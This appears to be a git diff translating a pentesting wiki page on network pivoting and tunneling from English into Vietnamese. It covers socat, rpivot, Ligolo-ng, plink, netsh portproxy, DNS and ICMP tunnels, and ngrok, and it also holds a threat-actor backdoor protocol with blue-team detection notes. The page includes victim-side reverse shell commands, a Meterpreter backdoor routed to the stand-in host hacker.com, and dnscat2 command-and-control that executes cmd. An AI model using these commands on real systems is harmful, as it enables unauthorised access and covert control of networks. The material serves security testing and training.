-- `wts://` selects WebTransport over QUIC. Start the server with `--enable-webtransport` (or a `wts://` listen URL) and allow UDP on the listening port. This mode cannot traverse a conventional HTTP `CONNECT` proxy because that proxy carries TCP.<sup>[[52]](#references)</sup>
+- Thêm `-p http://user:pass@proxy:8080` vào client để đi qua HTTP proxy tường minh. Dùng `socks5h://127.0.0.1:1080` trong các client như `curl` (hoặc bật proxied DNS trong ứng dụng) để các tên nội bộ được phân giải ở phía bên kia tunnel thay vì bị lộ cho local resolver.<sup>[[52]](#references)</sup>
+- `wss://` chọn WebSocket được bảo vệ bằng TLS. Client dùng `https://` sẽ chọn HTTP/2, nhưng việc buffering hoặc chuyển đổi sang HTTP/1 của reverse proxy/CDN thường làm hỏng luồng hai chiều; hãy để lộ trực tiếp wstunnel server khi kiểm thử chế độ này.<sup>[[52]](#references)</sup>
+- `wts://` chọn WebTransport qua QUIC. Khởi động server với `--enable-webtransport` (hoặc URL listen `wts://`) và cho phép UDP trên cổng đang lắng nghe. Chế độ này không thể đi qua HTTP `CONNECT` proxy thông thường vì proxy đó truyền TCP.<sup>[[52]](#references)</sup>
 
 > [!WARNING]
-> The upstream project warns not to treat its embedded self-signed certificate as privacy protection. Prefer a valid custom certificate plus `--tls-verify-certificate` (or mTLS), keep proxy listeners on loopback unless remote access is intentional, and tunnel already-secure protocols when confidentiality matters.<sup>[[52]](#references)</sup>
+> Dự án upstream cảnh báo không nên xem certificate tự ký được nhúng sẵn là biện pháp bảo vệ quyền riêng tư. Nên dùng certificate tùy chỉnh hợp lệ cùng với `--tls-verify-certificate` (hoặc mTLS), chỉ để proxy listener lắng nghe trên loopback trừ khi bạn chủ ý cho phép truy cập từ xa, và tunnel các giao thức vốn đã bảo mật khi cần tính bảo mật.<sup>[[52]](#references)</sup>
 
 ## Ligolo-ng
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-The Ligolo-ng quickstart documents a TUN interface on the proxy, certificate-fingerprint validation for the agent, and route setup for the tunneled network.<sup>[[17]](#references)</sup>
+Tài liệu bắt đầu nhanh của Ligolo-ng hướng dẫn tạo giao diện TUN trên proxy, xác thực fingerprint certificate cho agent và thiết lập route cho mạng được tunnel.<sup>[[17]](#references)</sup>
 
 ### Tunneling
 
@@ -394,9 +394,9 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 interface_list
 ```
 
-### Agent Binding and Listening
+### Binding và lắng nghe trên Agent
 
-Ligolo-ng can add listeners on the agent that forward to a proxy-side address, and its reserved `240.0.0.0/4` range can be routed to reach agent-local services.<sup>[[18]](#references)[[19]](#references)</sup>
+Ligolo-ng có thể thêm listener trên agent để chuyển tiếp đến một địa chỉ phía proxy, đồng thời có thể định tuyến dải dành riêng `240.0.0.0/4` để truy cập các dịch vụ cục bộ trên agent.<sup>[[18]](#references)[[19]](#references)</sup>
 
 ```bash
 # Establish a tunnel from the proxy server to the agent
@@ -406,7 +406,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 listener_list
 ```
 
-### Access Agent's Local Ports
+### Các cổng cục bộ của Access Agent
 
 ```bash
 # Establish a tunnel from the proxy server to the agent
@@ -418,7 +418,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Rpivot starts the reverse tunnel from the victim and exposes a SOCKS4 proxy on the attacker's loopback address; its README also documents NTLM-proxy credentials and hash options.<sup>[[20]](#references)</sup>
+Rpivot khởi tạo reverse tunnel từ máy nạn nhân và cung cấp một SOCKS4 proxy trên địa chỉ loopback của máy tấn công; README cũng mô tả thông tin xác thực và các tùy chọn hash cho NTLM-proxy.<sup>[[20]](#references)</sup>
 
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -428,7 +428,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
 
-Pivot through **NTLM proxy**
+Pivot qua **NTLM proxy**
 
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
@@ -442,7 +442,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-Socat composes address types such as `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, and `PROXY`; the examples below combine those documented endpoints.<sup>[[21]](#references)</sup>
+Socat kết hợp các loại địa chỉ như `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` và `PROXY`; các ví dụ bên dưới kết hợp những endpoint được mô tả trong tài liệu.<sup>[[21]](#references)</sup>
 
 ### Bind shell
 
@@ -464,13 +464,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
 
-### Port2Port through socks
+### Port2Port qua socks
 
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 
-### Meterpreter through SSL Socat
+### Meterpreter thông qua SSL Socat
 
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
@@ -482,7 +482,7 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 #Execute the meterpreter
 ```
 
-You can traverse a **non-authenticated proxy** with socat's documented `PROXY` address type by executing this line instead of the last one in the victim's console.<sup>[[21]](#references)</sup>
+Bạn có thể đi qua một **proxy không xác thực** bằng kiểu địa chỉ `PROXY` được socat tài liệu hóa, bằng cách chạy dòng này thay cho dòng cuối cùng trong console của nạn nhân.<sup>[[21]](#references)</sup>
 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
@@ -490,11 +490,11 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### Đường hầm Socat SSL
 
 **/bin/sh console**
 
-Create certificates on both sides: Client and Server
+Tạo chứng chỉ ở cả hai phía: Client và Server
 
 ```bash
 # Execute these commands on both sides
@@ -510,9 +510,9 @@ attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=cli
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
 
-### Remote Port2Port
+### Port2Port từ xa
 
-Connect the local SSH port (22) to the 443 port of the attacker host
+Kết nối cổng SSH cục bộ (22) với cổng 443 trên máy chủ của attacker.
 
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
@@ -522,11 +522,11 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 ## Plink.exe
 
-Plink is PuTTY's command-line connection tool, with SSH forwarding options similar to `ssh`.<sup>[[22]](#references)</sup>
+Plink là công cụ kết nối dòng lệnh của PuTTY, với các tùy chọn SSH forwarding tương tự `ssh`.<sup>[[22]](#references)</sup>
 
-Use uppercase `-P` for the SSH port. `-pw` is retained for compatibility but exposes the password in the process list; prefer key authentication or `-pwfile` where possible.<sup>[[22]](#references)[[23]](#references)</sup>
+Dùng `-P` viết hoa để chỉ định cổng SSH. `-pw` vẫn được giữ lại để tương thích, nhưng làm lộ mật khẩu trong danh sách tiến trình; nếu có thể, hãy ưu tiên xác thực bằng key hoặc dùng `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>
 
-As this binary will be executed in the victim and it is an SSH client, open the SSH service and port for the reverse connection; the following uses `-R` to forward a locally accessible port to the attacker's machine.<sup>[[22]](#references)</sup>
+Vì binary này sẽ được thực thi trên máy nạn nhân và là SSH client, hãy mở dịch vụ SSH và cổng cho kết nối ngược; ví dụ sau dùng `-R` để chuyển tiếp một cổng có thể truy cập cục bộ đến máy của attacker.<sup>[[22]](#references)</sup>
 
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
@@ -537,7 +537,7 @@ echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-Use a context with the permissions required by the host when creating or changing persistent `portproxy` rules. Microsoft documents the `v4tov4` add, show, and delete forms used below.<sup>[[24]](#references)</sup>
+Khi tạo hoặc thay đổi các quy tắc `portproxy` tồn tại lâu dài, hãy sử dụng ngữ cảnh có các quyền mà máy chủ yêu cầu. Microsoft ghi lại các dạng lệnh thêm, hiển thị và xóa `v4tov4` được sử dụng bên dưới.<sup>[[24]](#references)</sup>
 
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
@@ -549,63 +549,63 @@ netsh interface portproxy show v4tov4
 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 
-### Deploying `portproxy` through a scheduled task
+### Triển khai `portproxy` thông qua tác vụ đã lên lịch
 
-When administrative credentials are available, remote Task Scheduler execution can install a native forwarding rule without uploading a dedicated relay. For example, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) can make a pivot listen on TCP/443 and relay the connection to an internal SMB service.<sup>[[57]](#references)[[58]](#references)</sup>
+Khi có thông tin xác thực quản trị, có thể thực thi Task Scheduler từ xa để cài đặt quy tắc chuyển tiếp native mà không cần tải lên một relay chuyên dụng. Ví dụ: [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) có thể khiến pivot lắng nghe trên TCP/443 và chuyển tiếp kết nối đến dịch vụ SMB nội bộ.<sup>[[57]](#references)[[58]](#references)</sup>
 
 ```bash
 atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
   'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
 ```
 
-The rule is persistent, so enumerate it with `netsh interface portproxy show v4tov4` and remove it explicitly after testing. Remember that `portproxy` provides forwarding only; the host firewall must also permit the listening port.<sup>[[24]](#references)</sup>
+Quy tắc này là persistent, vì vậy hãy liệt kê bằng `netsh interface portproxy show v4tov4` và xóa thủ công sau khi kiểm thử. Hãy nhớ rằng `portproxy` chỉ cung cấp chức năng forwarding; host firewall cũng phải cho phép listening port.<sup>[[24]](#references)</sup>
 
 ## SocksOverRDP & Proxifier
 
-You need to have **RDP access over the system**.\
-Download:
+Bạn cần có **quyền truy cập RDP vào hệ thống**.\
+Tải xuống:
 
-SocksOverRDP uses Remote Desktop Dynamic Virtual Channels to carry a SOCKS5 connection over an existing RDP session; the client plugin listens on `127.0.0.1:1080` while the server component runs on the RDP target.<sup>[[25]](#references)</sup>
+SocksOverRDP sử dụng Remote Desktop Dynamic Virtual Channels để truyền kết nối SOCKS5 qua một phiên RDP hiện có; plugin client lắng nghe trên `127.0.0.1:1080`, trong khi thành phần server chạy trên RDP target.<sup>[[25]](#references)</sup>
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - This tool uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for **tunneling packets over the RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Công cụ này sử dụng `Dynamic Virtual Channels` (`DVC`) từ tính năng Remote Desktop Service của Windows. DVC chịu trách nhiệm **tunneling các packet qua kết nối RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-In your client computer load **`SocksOverRDP-Plugin.dll`** like this:
+Trên máy client, hãy tải **`SocksOverRDP-Plugin.dll`** như sau:
 
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 
-Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.
+Giờ chúng ta có thể **kết nối** với **nạn nhân** qua **RDP** bằng **`mstsc.exe`**, và sẽ nhận được **thông báo** cho biết **SocksOverRDP plugin đã được bật** và đang **lắng nghe** trên **127.0.0.1:1080**.
 
-**Connect** via **RDP** and upload & execute in the victim machine the `SocksOverRDP-Server.exe` binary:
+**Kết nối** qua **RDP**, sau đó tải lên và thực thi binary `SocksOverRDP-Server.exe` trên máy của nạn nhân:
 
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 
-Now, confirm in you machine (attacker) that the port 1080 is listening:
+Bây giờ, hãy xác nhận trên máy của bạn (attacker) rằng cổng 1080 đang lắng nghe:
 
 ```
 netstat -antb | findstr 1080
 ```
 
-Now you can use [**Proxifier**](https://www.proxifier.com/) to proxy the traffic through that port.<sup>[[26]](#references)</sup>
+Giờ bạn có thể dùng [**Proxifier**](https://www.proxifier.com/) để proxy lưu lượng qua cổng đó.<sup>[[26]](#references)</sup>
 
-### RDP virtual-channel hunting
+### Săn tìm trên kênh ảo RDP
 
-[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) is another RDP virtual-channel tunnel; its default channel name is `rdp2tcp`, although an operator can select a different name.<sup>[[56]](#references)</sup> Channel creation and closure are recorded in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` as event IDs **132** and **148**. Hunt for `rdp2tcp` and rare/random channel names, then compare them with expected channels such as `XPSRD`, `cliprdr`, and `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
+[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) là một tunnel kênh ảo RDP khác; tên kênh mặc định là `rdp2tcp`, nhưng người vận hành có thể chọn tên khác.<sup>[[56]](#references)</sup> Việc tạo và đóng kênh được ghi lại trong `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` dưới dạng các event ID **132** và **148**. Hãy tìm `rdp2tcp` và các tên kênh hiếm/ngẫu nhiên, sau đó đối chiếu chúng với các kênh dự kiến như `XPSRD`, `cliprdr` và `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>
 
-## Proxify Windows GUI Apps
+## Proxy ứng dụng GUI trên Windows
 
-You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
-In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
-In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify; Proxifier rules can match applications, target hosts, and ports.<sup>[[27]](#references)</sup>
+Bạn có thể cấu hình ứng dụng GUI trên Windows để truy cập qua proxy bằng [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
+Trong **Profile -> Proxy Servers**, thêm IP và cổng của máy chủ SOCKS.\
+Trong **Profile -> Proxification Rules**, thêm tên chương trình cần proxy và các kết nối đến những IP bạn muốn proxy; các quy tắc của Proxifier có thể khớp ứng dụng, máy chủ đích và cổng.<sup>[[27]](#references)</sup>
 
-## Tunnel through an NTLM proxy
+## Tunnel qua proxy NTLM
 
-The previously mentioned tool, **Rpivot**, can relay through an NTLM-authenticating proxy. **OpenVPN** can also route through one when configured with an auth file and the NTLMv2 method; this is proxy traversal, not a bypass of proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>
+Công cụ đã đề cập trước đó, **Rpivot**, có thể chuyển tiếp lưu lượng qua proxy xác thực NTLM. **OpenVPN** cũng có thể định tuyến qua proxy này khi được cấu hình với tệp xác thực và phương thức NTLMv2; đây là việc đi qua proxy, không phải vượt qua xác thực proxy.<sup>[[20]](#references)[[28]](#references)</sup>
 
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
@@ -615,8 +615,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Cntlm authenticates to upstream NTLM proxies, exposes local listeners, and can map a local tunnel port to a destination service; clients can then use that local port.<sup>[[29]](#references)</sup>\
-For example that forward port 443
+Cntlm xác thực với các proxy NTLM upstream, mở các listener cục bộ và có thể ánh xạ một cổng tunnel cục bộ đến dịch vụ đích; sau đó, client có thể sử dụng cổng cục bộ đó.<sup>[[29]](#references)</sup>\
+Ví dụ: chuyển tiếp cổng 443
 
 ```
 Username Alice
@@ -626,12 +626,12 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 
-Now, if you set for example in the victim the **SSH** service to listen in port 443, you can connect to it through the attacker port 2222.<sup>[[29]](#references)</sup>\
-You could also use a **meterpreter** that connects to localhost:443 while the attacker listens on port 2222.<sup>[[29]](#references)</sup>
+Giờ đây, nếu bạn đặt dịch vụ **SSH** trên máy nạn nhân lắng nghe, chẳng hạn, ở cổng 443, bạn có thể kết nối đến dịch vụ đó qua cổng 2222 của máy kẻ tấn công.<sup>[[29]](#references)</sup>\
+Bạn cũng có thể dùng **meterpreter** kết nối đến localhost:443 trong khi máy kẻ tấn công lắng nghe trên cổng 2222.<sup>[[29]](#references)</sup>
 
 ## YARP
 
-YARP (Yet Another Reverse Proxy) is Microsoft's .NET reverse-proxy toolkit. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
+YARP (Yet Another Reverse Proxy) là bộ công cụ reverse-proxy .NET của Microsoft. Bạn có thể tìm thấy tại đây: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>
 
 ## DNS Tunneling
 
@@ -639,7 +639,7 @@ YARP (Yet Another Reverse Proxy) is Microsoft's .NET reverse-proxy toolkit. You 
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Iodine creates an IPv4 tunnel through DNS queries and uses TUN interfaces; the documented setup requires the privileges needed to create those interfaces on both ends.<sup>[[31]](#references)</sup>
+Iodine tạo một tunnel IPv4 thông qua các truy vấn DNS và sử dụng các giao diện TUN; theo tài liệu, cần có các quyền cần thiết để tạo những giao diện đó ở cả hai đầu.<sup>[[31]](#references)</sup>
 
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
@@ -647,7 +647,7 @@ victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
 
-DNS transport has higher overhead than direct TCP and is typically slow; you can create a compressed SSH connection through this tunnel by using:<sup>[[31]](#references)</sup>
+DNS transport có overhead cao hơn TCP trực tiếp và thường chậm; bạn có thể tạo kết nối SSH được nén thông qua tunnel này bằng cách dùng:<sup>[[31]](#references)</sup>
 
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
@@ -655,9 +655,9 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 ### DNSCat2
 
-[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
+[**Tải xuống tại đây**](https://github.com/iagox86/dnscat2)**.**
 
-Dnscat2 establishes an encrypted command-and-control channel through DNS; the server and client commands below follow its documented usage.<sup>[[32]](#references)</sup>
+Dnscat2 thiết lập một kênh command-and-control được mã hóa qua DNS; các lệnh server và client bên dưới tuân theo cách sử dụng được tài liệu hóa.<sup>[[32]](#references)</sup>
 
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
@@ -668,64 +668,64 @@ attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local -
 victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 
-#### **In PowerShell**
+#### **Trong PowerShell**
 
-You can use [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) to run a dnscat2 client in PowerShell; its README documents the `Start-Dnscat2` parameters shown below.<sup>[[33]](#references)</sup>
+Bạn có thể dùng [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) để chạy dnscat2 client trong PowerShell; README của công cụ này mô tả các tham số `Start-Dnscat2` như bên dưới.<sup>[[33]](#references)</sup>
 
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
 
-#### **Port forwarding with dnscat**
+#### **Chuyển tiếp cổng bằng dnscat**
 
-Dnscat2's interactive `listen` command maps a local listener to a remote host and port.<sup>[[32]](#references)</sup>
+Lệnh tương tác `listen` của Dnscat2 ánh xạ một trình lắng nghe cục bộ đến máy chủ và cổng từ xa.<sup>[[32]](#references)</sup>
 
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 
-#### Change proxychains DNS
+#### Thay đổi DNS của proxychains
 
-Proxychains-ng hooks dynamically linked TCP connections and cannot carry UDP or ICMP; DNS proxying is configurable, so inspect the installed `proxychains.conf` and resolver helper instead of assuming a fixed public resolver. Legacy `proxyresolv` scripts expose `PROXY_DNS_SERVER` for choosing the resolver; use a resolver reachable from the pivot when internal names are required.<sup>[[34]](#references)[[35]](#references)</sup>
+Proxychains-ng móc nối các kết nối TCP được liên kết động và không thể truyền UDP hoặc ICMP; việc proxy DNS có thể cấu hình, vì vậy hãy kiểm tra `proxychains.conf` đã cài đặt và helper phân giải tên thay vì mặc định một DNS công khai cố định. Các script `proxyresolv` cũ cung cấp `PROXY_DNS_SERVER` để chọn DNS; hãy dùng DNS có thể truy cập từ pivot khi cần phân giải tên nội bộ.<sup>[[34]](#references)[[35]](#references)</sup>
 
-## Tunnels in Go
+## Tunnel trong Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-### Custom DNS TXT / HTTP JSON C2 (AK47C2)
+### C2 tùy chỉnh qua DNS TXT / HTTP JSON (AK47C2)
 
-The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.<sup>[[2]](#references)</sup>
+Tác nhân Storm-2603 đã tạo một **C2 hai kênh ("AK47C2")** lợi dụng *chỉ* lưu lượng **DNS** đi ra và **HTTP POST thuần** – hai giao thức hiếm khi bị chặn trên mạng doanh nghiệp.<sup>[[2]](#references)</sup>
 
-1. **DNS mode (AK47DNS)**
-   • Generates a random 5-character SessionID (e.g. `H4T14`).  
-   • Prepends `1` for *task requests* or `2` for *results* and concatenates different fields (flags, SessionID, computer name).  
-   • Each field is **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, and glued together with dots – finally ending with the attacker-controlled domain:
+1. **Chế độ DNS (AK47DNS)**
+   • Tạo SessionID ngẫu nhiên gồm 5 ký tự (ví dụ: `H4T14`).  
+   • Thêm tiền tố `1` cho *yêu cầu tác vụ* hoặc `2` cho *kết quả*, rồi nối các trường khác nhau (cờ, SessionID, tên máy tính).  
+   • Mỗi trường được **mã hóa XOR bằng khóa ASCII `VHBD@H`**, chuyển sang dạng hex và ghép với nhau bằng dấu chấm – cuối cùng kết thúc bằng tên miền do kẻ tấn công kiểm soát:
 
    ```text
    <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
    ```
 
-   • Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.  
-   • When the response exceeds 0xFF bytes the backdoor **fragments** the data into 63-byte pieces and inserts the markers:
-     `s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.
+   • Các request sử dụng `DnsQuery()` cho các bản ghi **TXT** (và **MG** dự phòng).  
+   • Khi phản hồi vượt quá 0xFF byte, backdoor **chia nhỏ** dữ liệu thành các phần 63 byte và chèn các marker:
+     `s<SessionID>t<TOTAL>p<POS>` để máy chủ C2 có thể sắp xếp lại chúng.
 
-2. **HTTP mode (AK47HTTP)**
-   • Builds a JSON envelope:
+2. **Chế độ HTTP (AK47HTTP)**
+   • Tạo một JSON envelope:
    ```json
    {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
    ```
-   • The whole blob is XOR-`VHBD@H` → hex → sent as the body of a **`POST /`** with header `Content-Type: text/plain`.
-   • The reply follows the same encoding and the `cmd` field is executed with `cmd.exe /c <command> 2>&1`.
+   • Toàn bộ blob được XOR-`VHBD@H` → hex → gửi làm body của **`POST /`** với header `Content-Type: text/plain`.
+   • Phản hồi dùng cùng cách mã hóa và trường `cmd` được thực thi bằng `cmd.exe /c <command> 2>&1`.
 
-Blue Team notes
-• Look for unusual **TXT queries** whose first label is long hexadecimal and always end in one rare domain.  
-• A constant XOR key followed by ASCII-hex is easy to detect with YARA: `6?56484244?484` (`VHBD@H` in hex).  
-• For HTTP, flag text/plain POST bodies that are pure hex and multiple of two bytes.
+Ghi chú của Blue Team
+• Tìm các truy vấn **TXT** bất thường có nhãn đầu tiên là chuỗi hexadecimal dài và luôn kết thúc bằng cùng một domain hiếm.
+• Khóa XOR cố định theo sau bởi ASCII-hex rất dễ phát hiện bằng YARA: `6?56484244?484` (`VHBD@H` ở dạng hex).
+• Với HTTP, đánh dấu các body của POST `text/plain` chỉ chứa hex và có độ dài là bội số của hai byte.
 
 {{#note}}
-The channel keeps each sub-domain label within the 63-octet DNS limit, but protocol compliance alone does not make it stealthy; rare domains, long hexadecimal labels, and query volume remain detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
+Kênh này giữ mỗi nhãn sub-domain trong giới hạn 63 octet của DNS, nhưng việc tuân thủ giao thức không đồng nghĩa với khả năng ẩn mình; domain hiếm, nhãn hexadecimal dài và lưu lượng truy vấn lớn vẫn là các dấu hiệu phát hiện.<sup>[[2]](#references)[[36]](#references)</sup>
 {{#endnote}}
 
 ## ICMP Tunneling
@@ -735,7 +735,7 @@ The channel keeps each sub-domain label within the 63-octet DNS limit, but proto
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Hans documents an IPv4-over-ICMP tunnel using a TUN device and ICMP echo requests; the setup requires privileges sufficient to create the interface.<sup>[[37]](#references)</sup>
+Hans mô tả một tunnel IPv4-over-ICMP sử dụng thiết bị TUN và các yêu cầu ICMP echo; quá trình thiết lập cần đủ quyền để tạo giao diện mạng.<sup>[[37]](#references)</sup>
 
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
@@ -745,9 +745,9 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 
 ### ptunnel-ng
 
-[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
+[**Tải xuống tại đây**](https://github.com/utoni/ptunnel-ng.git).
 
-ptunnel-ng transports TCP connections over ICMP and uses the `-p`, `-l`, `-r`, and `-R` options shown below for the proxy, local listener, destination host, and destination port.<sup>[[38]](#references)</sup>
+ptunnel-ng truyền các kết nối TCP qua ICMP và sử dụng các tùy chọn `-p`, `-l`, `-r` và `-R` bên dưới cho proxy, trình lắng nghe cục bộ, máy chủ đích và cổng đích.<sup>[[38]](#references)</sup>
 
 ```bash
 # Generate it
@@ -765,12 +765,12 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) is an agent for putting local network services online through a secure tunnel; its CLI documents HTTP, TCP, and file URL endpoints, and the printed endpoint hostname can vary by endpoint and account.<sup>[[39]](#references)</sup>
+[**ngrok**](https://ngrok.com/) là một agent giúp đưa các dịch vụ mạng cục bộ lên mạng thông qua tunnel bảo mật; CLI của nó ghi lại các endpoint HTTP, TCP và URL tệp, còn hostname endpoint được in ra có thể thay đổi tùy theo endpoint và tài khoản.<sup>[[39]](#references)</sup>
 
-### Installation
+### Cài đặt
 
-- Create an account: https://ngrok.com/signup
-- Client download:
+- Tạo tài khoản: https://ngrok.com/signup
+- Tải xuống client:
 
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
@@ -779,11 +779,11 @@ chmod a+x ./ngrok
 ./ngrok config edit
 ```
 
-### Basic usages
+### Cách sử dụng cơ bản
 
-**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**Tài liệu:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_The agent also supports authentication and TLS options when needed.<sup>[[39]](#references)</sup>_
+_The agent cũng hỗ trợ các tùy chọn authentication và TLS khi cần.<sup>[[39]](#references)</sup>_
 
 #### Tunneling TCP
 
@@ -795,7 +795,7 @@ _The agent also supports authentication and TLS options when needed.<sup>[[39]](
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
 
-#### Exposing files with HTTP
+#### Công khai tệp qua HTTP
 
 ```bash
 ./ngrok http file:///tmp/httpbin/
@@ -804,12 +804,12 @@ _The agent also supports authentication and TLS options when needed.<sup>[[39]](
 
 #### Sniffing HTTP calls
 
-_Useful for XSS,SSRF,SSTI ..._\
-The standalone agent exposes its HTTP inspection interface at `http://127.0.0.1:4040` by default; the interface is for HTTP traffic.<sup>[[40]](#references)</sup>
